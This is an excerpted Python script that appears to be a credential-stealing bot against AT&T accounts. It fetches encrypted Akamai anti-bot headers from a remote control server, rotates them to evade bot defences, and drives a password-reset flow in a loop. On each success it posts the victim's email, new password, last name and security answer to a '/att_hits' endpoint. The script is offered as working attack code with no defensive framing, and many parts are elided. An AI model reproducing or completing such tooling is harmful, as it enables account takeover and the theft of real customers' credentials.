...
class att():
	...
	def send_hit_to_server(self, capture_string: str):
		try:
			req = requests.post(f'{WEBSITE_URL}/att_hits', params={'key': this_key}, json={
	...
	def get_from_server_akamai_headers(self, add_only_new: bool = False):
		req = requests.get(f'{WEBSITE_URL}/headers', params={'key': this_key}, headers={SECRET_HEADER: SECRET_VALUE})
		akamai_headers = req.json().get('headers', [])
		v = 0
		if add_only_new:
			cur.execute('SELECT headers FROM akamai_headers')
			stored_akamai_headers = [x['headers'] for x in cur.fetchall()]
			akamai_headers = [x for x in akamai_headers if x not in stored_akamai_headers]
		for this_akamai_headers in akamai_headers:
			cur.execute('INSERT INTO akamai_headers(headers, create_date) VALUES (?, ?)', [this_akamai_headers, int(time.time())])
			v+=1
		if v == 0:
			return
		con.commit()
		print(f'[+] Loaded {v} akamai headers')

	def mark_as_recheck_akamai_headers(self):
		req = requests.patch(f'{WEBSITE_URL}/headers', params={'key': this_key}, headers={SECRET_HEADER: SECRET_VALUE})
		return req.json().get('status', False)

	def decrypt_akamai_header(self, header: dict):
		header['headers'] = json.loads(cipher.decrypt(header['headers'].encode()).decode())
		header['user_agent'] = header['headers']['user_agent']
		header['sec_ch_ua'] = header['headers']['sec_ch_ua']
		header['sec_ch_ua_platform'] = header['headers']['sec_ch_ua_platform']
		header['att_convid'] = header['headers']['att_convid']
		return header
	...
	def get_akamai_headers(self):
		...
		if not result:
			return None
		result = self.decrypt_akamai_header(result)
	...
	def delete_akamai_headers(self, id: int = None):
		if id:
			...
			cur.execute('DELETE FROM akamai_headers WHERE fails > 2')
		con.commit()
	...
	def send_email(self, is_goto: bool = False, id_collision: bool = False):
		...
		if self.last_akamai_log > 20:
			self.get_from_server_akamai_headers(True)
		...
		if not id_collision:
			...
			if not self.akamai_headers:
				print(f'[-] There is no akamai headers, loading old one')
				result = self.mark_as_recheck_akamai_headers()
				if result:
					self.get_from_server_akamai_headers()
					print(f'[+] Successfully loaded old akamai headers')
				else:
					print(f'[-] Cant load old akamai headers')
	...
	def set_password(self, is_goto: bool = False):
		...
		if 'PMS_SUCCESS' in req.text:
			self.send_hit_to_server(f'{self.email}:{self.new_password}:{self.last_name}:{self.selected_question_id}:{self.answer}')
...
if __name__ == "__main__":
	...
	while True:
		client = att()
		client.last_akamai_log = last_akamai_log
		...
		while True:
			...
			if result == 'success': ...
			elif result == 'change_creds':
				last_akamai_log = client.last_akamai_log
				break
			elif result == 'retry':
				print('retrying')
				continue
